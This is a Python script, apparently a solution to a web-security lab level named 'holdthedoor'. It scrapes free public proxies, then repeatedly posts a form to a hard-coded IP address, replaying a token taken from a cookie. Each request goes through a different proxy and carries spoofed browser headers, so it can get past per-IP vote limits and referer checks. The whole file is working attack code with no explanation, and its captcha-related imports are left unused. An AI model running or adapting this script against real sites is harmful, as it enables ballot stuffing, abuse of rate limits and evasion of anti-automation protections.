#!/usr/bin/python3
import requests
import pytesseract
from PIL import Image
from lxml.html import fromstring

def get_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:500]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies

proxies = get_proxies()
url = 'http://158.69.76.135/level4.php'
img = 'http://158.69.76.135/captcha.php'
myobj = {
    'id': '1',
    'key': None,
    'holdthedoor': 'Submit+Query'
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Origin': 'http://158.69.76.135',
    'Referer': 'http://158.69.76.135/level4.php'
}
print(proxies)
i = 0
j = 0
for prox in proxies:
    session = requests.Session()
    session.trust_env = False
    r = session.get(url)
    myobj['key'] = r.cookies['HoldTheDoor']
    try:
        x = session.post(url, data = myobj, headers=headers, proxies={"http": "http://" + prox}, timeout=30)
    except:
        print("fail", j)
        j += 1
        continue
    print("success", i, x.text)
    i += 1
